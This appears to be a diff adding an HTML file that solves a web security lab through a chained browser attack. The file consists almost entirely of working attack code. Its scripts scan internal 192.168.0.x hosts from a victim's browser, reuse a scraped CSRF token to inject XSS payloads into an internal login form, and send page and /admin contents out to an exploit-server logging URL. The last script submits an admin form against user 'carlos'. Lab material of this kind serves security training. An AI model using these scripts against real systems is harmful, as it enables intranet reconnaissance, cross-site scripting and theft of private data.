@@ -1,0 +1,102 @@
+<!-- Step 1 - determine location and page -->
+<script>
+  let q = []
+  let attackerURL = "http://exploit-0a90009603d9601fc27e426c01210076.exploit-server.net/logs"
+
+  for (i = 1; i <= 255; i++) {
+    q.push(
+      (function (url) {
+        return function (wait) {
+          fetchUrl(url, wait);
+        };
+      })("http://192.168.0." + i + ":8080")
+    );
+  }
+
+  for (i = 1; i <= 8; i++) {
+    if (q.length) q.shift()(500); // 8 threads, waiting about 0.5s max
+  }
+
+  function fetchUrl(url, wait) {
+    var controller = new AbortController(),
+      signal = controller.signal;
+    fetch(url, { signal })
+      .then((r) =>
+        r.text().then((text) => {
+          location =
+            attackerURL +
+            "?ip=" +
+            url.replace(/^http:\/\//, "") +
+            "&code=" +
+            btoa(text) +
+            "&" +
+            Date.now();
+        })
+      )
+      .catch((e) => {
+        if (q.length) {
+          q.shift()(wait); // try a different ip
+        }
+      });
+    setTimeout((x) => {
+      controller.abort();
+      if (q.length) {
+        q.shift()(wait); // waited max time try a different ip
+      }
+    }, wait);
+  }
+</script>
+
+<!-- Can run `document.write(atob(code))` in a separate chrome window to see the contents -->
+
+<!-- Check for xss on internal site -->
+<script>
+  attackerURL = "http://exploit-0a90009603d9601fc27e426c01210076.exploit-server.net/logs";
+  function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+
+  function fetchUrl(url, collaboratorURL){
+    fetch(url).then(r => r.text().then(text => {
+      xss(url, text, '"><img src='+attackerURL+'?foundXSS=1>');
+    }))
+  }
+
+  fetchUrl("http://192.168.0.217:8080", attackerURL);
+</script>
+
+<!-- Try and see what we can see -->
+<script>
+  attackerURL = "http://exploit-0a90009603d9601fc27e426c01210076.exploit-server.net/logs";
+  function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+
+  function fetchUrl(url, collaboratorURL){
+    fetch(url).then(r=>r.text().then(text=>
+    {
+      xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+attackerURL+'?code=\'+btoa(this.contentWindow.document.body.innerHTML)">');
+    }
+    ))
+  }
+
+  fetchUrl("http://192.168.0.217:8080", attackerURL);
+</script>
+
+<!-- -->
+<script>
+  attackerURL = "http://exploit-0a90009603d9601fc27e426c01210076.exploit-server.net/logs";
+  function xss(url, text, vector) {
+    location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+  }
+
+  function fetchUrl(url){
+    fetch(url).then(r=>r.text().then(text=>
+    {
+    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+    }
+    ))
+  }
+
+  fetchUrl("http://192.168.0.217:8080");
+</script>
